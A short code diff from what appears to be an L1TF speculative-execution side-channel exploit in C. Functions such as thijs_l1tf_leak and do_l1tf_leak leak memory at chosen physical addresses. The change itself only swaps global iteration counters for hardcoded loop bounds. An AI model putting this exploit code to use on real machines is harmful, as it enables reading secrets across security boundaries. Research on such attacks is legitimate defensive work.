@@ -231,8 +231,6 @@ void thijs_l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
 
 }
 
-int THIJS_ITERS = 1000;
-
 char *thijs_l1tf_leak(uintptr_t base, const uintptr_t phys_addr, const size_t length)
 {
 	half_spectre_start(base, phys_addr);
@@ -251,7 +249,7 @@ char *thijs_l1tf_leak(uintptr_t base, const uintptr_t phys_addr, const size_t le
   size_t start = (phys_addr & 0xfff);
   assert(start + length < 0xfff);
 
-  for (int x = 0; x < THIJS_ITERS; ++x) {
+  for (int x = 0; x < 5000; ++x) {
     for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
       void *leak_addr = (char *)leak.leak + j;
       size_t high =
@@ -804,8 +802,6 @@ static int hit_analyze(void)
   return hit[0] ? 0 : -1;
 }
 
-int MATHE_ITERS = 1000;
-
 int do_l1tf_leak(char *leak) {
   memset(hit, 0, sizeof(hit));
   int attempt = 0;
@@ -816,7 +812,7 @@ int do_l1tf_leak(char *leak) {
     for (int i = 0; i < 500; i++)
       l1tf_core(leak);
     rbuf_reload();
-  } while (attempt++ < MATHE_ITERS);
+  } while (attempt++ < 1000);
   return hit_analyze();
 }
 
